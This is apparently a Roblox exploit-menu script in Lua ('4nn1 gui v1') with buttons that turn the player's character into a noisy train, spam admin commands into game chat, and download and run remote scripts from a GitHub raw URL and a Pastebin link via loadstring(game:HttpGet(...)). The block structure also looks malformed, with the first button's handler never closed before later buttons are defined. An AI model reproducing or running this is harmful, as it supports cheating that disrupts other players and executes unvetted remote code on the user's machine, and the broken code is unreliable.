
-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local Nameless = Instance.new("TextButton")
local fedoraadmin = Instance.new("TextButton")
local Energizegui = Instance.new("TextButton")
local SPAMCHAT = Instance.new("TextButton")
local _4nn1gui = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn=false

ImageLabel.Parent = ScreenGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.159624413, 0, 0.141975313, 0)
ImageLabel.Size = UDim2.new(0, 250, 0, 256)
ImageLabel.Image = "rbxassetid://17638519238"
ImageLabel.ImageTransparency = 0.400

Nameless.Name = "Nameless"
Nameless.Parent = ImageLabel
Nameless.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Nameless.BorderColor3 = Color3.fromRGB(0, 0, 0)
Nameless.BorderSizePixel = 3
Nameless.Position = UDim2.new(0.0520000011, 0, 0.26953125, 0)
Nameless.Size = UDim2.new(0, 103, 0, 40)
Nameless.Font = Enum.Font.SourceSans
Nameless.Text = "Thomas"
Nameless.TextColor3 = Color3.fromRGB(0, 0, 0)
Nameless.TextSize = 14.000
Nameless.MouseButton1Down:connect(function()
	 local p = game.Players.LocalPlayer.Character
local weld = Instance.new("Weld",p.Torso)
weld.Part0 = p.Torso

local train = Instance.new("Part",p.Torso)
train.Anchored = true
train.CanCollide = false
train.Size = Vector3.new(3,2,6)
train.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
weld.Part1 = train
weld.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,math.rad(180),0)
train.Anchored = false
local TrainMesh = Instance.new("SpecialMesh",train)
TrainMesh.MeshType = Enum.MeshType.FileMesh
TrainMesh.Scale = Vector3.new(0.020,0.020,0.015)
TrainMesh.MeshId = "rbxassetid://1"
TrainMesh.TextureId = "rbxassetid://431017809"

local weld2 = Instance.new("Weld",p.Torso)
weld2.Part0 = p.Torso
local Smoke = Instance.new("Part",p.Torso)
Smoke.Anchored = true
Smoke.CanCollide = false
Smoke.Size = Vector3.new(1,1,1)
Smoke.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
weld2.Part1 = Smoke
weld2.C1 = CFrame.new(0,-4,3.5)
Smoke.Anchored = false
Smoke.Transparency = 1

game.Players:Chat(">hat me 17615406173 >light me 9483 white :hat me 17615406173 :light me 9483 white  ;hat me 17615406173 ;light me 9483 white ")

local Particle = Instance.new("ParticleEmitter",Smoke)
Particle.Rate = 50
Particle.Speed = NumberRange.new(30,60)
Particle.VelocitySpread = 4
Particle.Texture = "rbxassetid://133619974"

local Light = Instance.new("SpotLight",train)
Light.Angle = 45
Light.Brightness = 100
Light.Face = Enum.NormalId.Back
Light.Range = 30

p.Humanoid.WalkSpeed = 60

for i,v in pairs(p:GetChildren()) do
	if v:IsA("Part") then
		v.Transparency = 1
	elseif v:IsA("Hat") then
		v:Destroy()
	elseif v:IsA("Model") then
		v:Destroy()
	end
end

local function SFX(id) 
	local s=Instance.new("Sound",p.Torso)
	s.SoundId = "rbxassetid://"..id
	s.Volume = 1
	return s
end

train.Touched:connect(function(p)
	-- The kill functionality has been removed
end)

local Music = SFX(190819252)
Music.Looped = true
wait(1)
Music:Play()
-- ~CL 2016
		
fedoraadmin.Name = "fedora admin"
fedoraadmin.Parent = ImageLabel
fedoraadmin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fedoraadmin.BorderColor3 = Color3.fromRGB(0, 0, 0)
fedoraadmin.BorderSizePixel = 3
fedoraadmin.Position = UDim2.new(0.541596174, 0, 0.268325627, 0)
fedoraadmin.Size = UDim2.new(0, 103, 0, 40)
fedoraadmin.Font = Enum.Font.SourceSans
fedoraadmin.Text = "Fedora Admin"
fedoraadmin.TextColor3 = Color3.fromRGB(0, 0, 0)
fedoraadmin.TextSize = 14.000
fedoraadmin.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
end)
Energizegui.Name = "Energize gui"
Energizegui.Parent = ImageLabel
Energizegui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Energizegui.BorderColor3 = Color3.fromRGB(0, 0, 0)
Energizegui.BorderSizePixel = 3
Energizegui.Position = UDim2.new(0.0508826301, 0, 0.486159325, 0)
Energizegui.Size = UDim2.new(0, 103, 0, 38)
Energizegui.Font = Enum.Font.SourceSans
Energizegui.Text = "Energize Gui"
Energizegui.TextColor3 = Color3.fromRGB(0, 0, 0)
Energizegui.TextSize = 14.000
Energizegui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/0MLPL32f'))()
end)
SPAMCHAT.Name = "SPAM CHAT"
SPAMCHAT.Parent = ImageLabel
SPAMCHAT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SPAMCHAT.BorderColor3 = Color3.fromRGB(0, 0, 0)
SPAMCHAT.BorderSizePixel = 3
SPAMCHAT.Position = UDim2.new(0.541596174, 0, 0.478941619, 0)
SPAMCHAT.Size = UDim2.new(0, 102, 0, 40)
SPAMCHAT.Font = Enum.Font.SourceSans
SPAMCHAT.Text = "print ig"
SPAMCHAT.TextColor3 = Color3.fromRGB(0, 0, 0)
SPAMCHAT.TextSize = 14.000
SPAMCHAT.MouseButton1Down:connect(function()
	print("bopz41")
end)
_4nn1gui.Name = "4nn1 gui"
_4nn1gui.Parent = ImageLabel
_4nn1gui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_4nn1gui.BorderColor3 = Color3.fromRGB(0, 0, 0)
_4nn1gui.BorderSizePixel = 0
_4nn1gui.Size = UDim2.new(0, 248, 0, 56)
_4nn1gui.Font = Enum.Font.SourceSans
_4nn1gui.Text = "4nn1 gui v1"
_4nn1gui.TextColor3 = Color3.fromRGB(0, 0, 0)
_4nn1gui.TextSize = 14.000
